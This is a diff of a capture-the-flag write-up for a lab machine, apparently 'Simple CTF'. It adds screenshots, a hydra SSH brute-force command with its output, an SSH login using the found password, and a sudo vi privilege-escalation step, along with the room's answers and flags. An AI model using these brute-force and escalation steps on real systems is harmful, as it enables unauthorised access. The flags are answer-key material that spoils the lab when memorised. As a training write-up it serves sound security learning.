@@ -21,7 +21,7 @@ since 2222 is greater than 1000 the answer is
 > ssh
 
 ## Port 80: Apache
-imade
+![image](./ScreenShots/webserver.png)
 Let's continue enumeration using Gobuster
 
 ## Gobuster
@@ -41,14 +41,14 @@ To find Directories in the web server
 _Useful findings : ``/robots.txt``, ``/simple``_
 
 ### /robots.txt
-image
+![image](./ScreenShots/robots.png)
 
 ### /simple
-image
-It appears that this site is using content management system(CMS). I scrolled down the page, and was able to find what version of this software is
-image
-After searching for the version in exploit db ,I found that there is an sql injuction vulnerablity in that version
-image
+![image](./ScreenShots/simple.png)
+##### It appears that this site is using content management system(CMS). I scrolled down the page, and was able to find what version of this software is
+![image](./ScreenShots/exploitdb.png)
+##### After searching for the version in exploit db ,I found that there is an sql injuction vulnerablity in that version
+![image](./ScreenShots/exploit.png)
 ### What's the CVE you're using against the application?
 > CVE-2019-9053
 
@@ -62,20 +62,49 @@ so use hydra to bruteforce username and password
 ```bash
 hydra -l usernames.txt -P best110.txt ssh://10.10.140.110:2222 -t 4
 ```
+```
+[DATA] attacking ssh://10.10.140.110:2222/
+[2222][ssh] host: 10.10.140.110   login: mitch   password: secret
+```
 ### What's the password?
 > secret
 
-### Where can you loginwith the details obtained?
+### Where can you login with the details obtained?
+we got ssh user name and password 
 > ssh
+## Login into ssh
+```
+ssh mitch@10.10.140.110 -p 2222
+pasword: secret
+```
+![image](./ScreenShots/ssh.png)
 
 ### What's the user flag?
+![image](./ScreenShots/user.png)
+```
+cat user.txt
+```
 > G00d j0b, keep up!
 
 ### Is there any other user in the home directory? What's its name?
+```
+ls /home
+```
+![image](./ScreenShots/users.png)
 > sunbath
 
 ### What can you leverage to spawn a privileged shell?
+```
+sudo -l
+```
+![image](./ScreenShots/vim.png)
 > vim
-
+## Escalate Privilage
+To escalate privilage we need to exploit vim
+```
+sudo vi
+```
+![image](./ScreenShots/sudo.png)
 ### What's the root flag?
+![image](./ScreenShots/root.png)
 > W3ll d0n3. You made it!
